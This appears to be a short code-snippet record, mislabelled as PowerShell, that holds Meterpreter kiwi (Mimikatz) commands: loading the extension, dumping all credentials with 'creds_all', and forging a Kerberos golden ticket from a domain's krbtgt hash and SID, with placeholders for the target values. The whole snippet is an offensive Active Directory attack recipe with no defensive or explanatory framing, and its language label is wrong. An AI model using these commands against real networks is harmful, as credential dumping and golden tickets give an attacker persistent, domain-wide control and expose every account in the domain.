---
id: a5b9fa44-0f85-439e-9c47-59d25a0ba8d8
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:21.535681+00:00'
updated_at: '2023-04-10T20:24:57.227226+00:00'
---

# Code Snippet a5b9fa44

**Language**: Powershell

```powershell
load kiwi
creds_all
golden_ticket_create -d <domainname> -k <nthashof krbtgt> -s <SID without le RID> -u <user_for_the_ticket> -t <location_to_store_tck>
```


